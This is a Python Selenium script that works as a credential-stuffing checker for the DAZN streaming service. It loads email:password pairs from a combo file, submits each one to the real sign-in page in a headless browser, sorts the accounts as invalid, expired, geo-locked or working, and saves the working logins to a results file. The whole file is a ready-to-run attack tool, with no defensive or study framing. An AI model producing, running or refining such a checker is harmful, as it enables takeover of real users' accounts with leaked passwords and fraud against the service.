import time
import os
from headers.dazn_header import header
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, InvalidSessionIdException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path
header()
file_directory = str(Path(__file__).parent)+'/dazn'
page = 'https://www.dazn.com/en-GB/signin'
info_list =[]
users = []
passwords = []
countries = []
browser_options = Options()
browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
browser_options.headless = True

os.makedirs('accounts',exist_ok=True)

with open(file_directory, 'r') as dazn:
	for line in dazn.readlines():
		try:
			users.append(line.split(':')[0].strip())
			passwords.append(line.split(':')[1].split(' | ')[0].strip())
			countries.append(line.split(' | ')[1].strip())
		except IndexError:
			continue
index = 0

while index != len(users):
	if index == 10:
		header()
	with open('accounts/dazn_working_accounts','a') as account_results:
		try:
			print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
			browser = webdriver.Chrome(options = browser_options)
			browser.set_window_size(500,700)
			browser.get(page)
			time.sleep(4)
			gdpr_accept_all = browser.find_element_by_xpath('//*[@id="onetrust-accept-btn-handler"]')
			gdpr_accept_all.click()
			time.sleep(1)
			email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
			password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
			sign_in_button = browser.find_element_by_xpath('//*[@id="root"]/div[1]/main/form/button')
			email_input_box.send_keys(users[index])
			password_input_box.send_keys(passwords[index])
			sign_in_button.click()
			time.sleep(7)				
			if browser.find_elements_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span'):			
				error = browser.find_element_by_xpath('/html/body/reach-portal/div[3]/div/div/div/div[1]/span').text				
				if 'Your email address and/or password are incorrect' in str(error):
					print(" | {}:{} ---> Credentials don't exist\n".format(users[index],passwords[index]))
					index += 1
					browser.close()				
				if 'You can only access DAZN in the country where you created your account' in str(error):
					account_results.write('{}:{} ---> Good Account, geo-locked login ({})'.format(users[index], passwords[index], countries[index]))
					index += 1
					browser.close()			
			if browser.find_elements_by_xpath('//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):			
				expired_account_text = browser.find_element_by_xpath('//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div').text
				if 'Welcome back.' in expired_account_text:
					print(' | {}:{} ---> Account Expired'.format(users[index],passwords[index]))
					index += 1
					browser.close()
					continue
			else:
				account_results.write('{}:{} ---> Good Account\n'.format(users[index],passwords[index]))
				browser.close()
				index += 1
				continue	
										
		except ElementClickInterceptedException:			
			print(' | Click Intercepted, iteration index was not incremented.')
			continue
			
		except InvalidSessionIdException:
			print('Session terminated unexpectedly, but combo list was completed.\n')
			break
